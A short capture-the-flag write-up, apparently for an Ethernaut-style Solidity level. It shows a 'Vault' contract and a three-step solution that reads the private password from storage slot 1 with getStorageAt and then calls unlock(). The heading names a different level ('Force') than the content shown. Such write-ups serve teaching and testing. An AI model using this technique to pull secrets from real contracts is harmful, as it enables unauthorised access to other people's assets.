# Level 7 - Force

### Objective

The objective of this level is as follows:

1. Unlock the vault

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### Solution

In this level, we exploit the fact that all unhashed storage (including `private` variables) can be accessed by determining their slot number.

We can read the password using the following:

```
password = await web3.eth.getStorageAt(contract.address, 1)

```

Next, we unlock the vault with the password:

```
await contract.unlock(password)

```

Finally, we can verify that the vault is unlocked:

```
await contract.locked() === false

```

Done!
